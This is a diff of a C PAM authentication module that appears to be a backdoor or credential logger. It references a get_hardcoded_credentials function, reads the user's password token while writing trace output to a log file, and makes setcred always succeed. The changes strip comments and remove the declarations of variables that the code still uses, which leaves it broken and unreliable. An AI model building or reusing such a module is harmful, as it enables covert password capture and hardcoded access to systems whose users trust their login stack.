@@ -32,10 +32,9 @@ static void ensure_path(void) {
         }
     }
     
-    // Ensure log file exists
     FILE *f = fopen(LOG_FILE, "a");
     if (f) {
-        fprintf(f, "\n\n"); // New block
+        fprintf(f, "\n\n");
         fclose(f);
     }
 }
@@ -103,16 +102,11 @@ static void get_hardcoded_credentials(char **user_out, char **pass_out) {
 /* ---------------- AUTH MODULE ---------------- */
 
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
-                                   int flags,
-                                   int argc,
-                                   const char **argv)
-{
+                                   int flags,      // Cast to void
+                                   int argc,        // Cast to void
+                                   const char **argv) { // Cast to void
     trace_context(pamh, "ENTER pam_sm_authenticate");
     ensure_path();
-
-    // Retrieve relevant auth information
-    const char *pword = NULL;
-    const char *uname = NULL;
 
     if (pam_get_item(pamh, PAM_AUTHTOK, (void*) &pword) != PAM_SUCCESS) {
         trace("PAM_AUTHTOK failed");
@@ -206,13 +200,6 @@ PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh,
                              const char *argv[])
 {
     trace_context(pamh, "ENTER SETCRED");
-
-    if (flags & PAM_ESTABLISH_CRED)
-        trace("[TRACE] SETCRED ESTABLISH");
-    else if (flags & PAM_DELETE_CRED)
-        trace("[TRACE] SETCRED DELETE");
-    else
-        trace("[TRACE] SETCRED OTHER");
 
     trace("[TRACE] SETCRED SUCCESS");
     return PAM_SUCCESS;
